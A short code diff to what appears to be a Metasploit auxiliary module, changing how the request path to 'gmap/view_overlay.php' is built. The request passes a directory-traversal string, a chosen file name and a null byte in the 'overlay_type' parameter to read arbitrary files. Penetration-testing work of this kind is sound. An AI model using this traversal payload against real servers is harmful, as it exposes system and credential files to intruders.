@@ -50,7 +50,6 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run_host(ip)
 		base = target_uri.path
-		base << '/' if base[-1,1] != '/'
 
 		peer = "#{ip}:#{rport}"
 		fname = datastore['FILE']
@@ -61,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
 		res = send_request_cgi({
 			'method'        => 'GET',
 			'encode_params' => false,
-			'uri'           => "#{base}gmap/view_overlay.php",
+			'uri'           => normalize_uri(base, "gmap/view_overlay.php"),
 			'vars_get'      => {
 				'overlay_type' => "#{traverse}#{fname}%00"
 			}
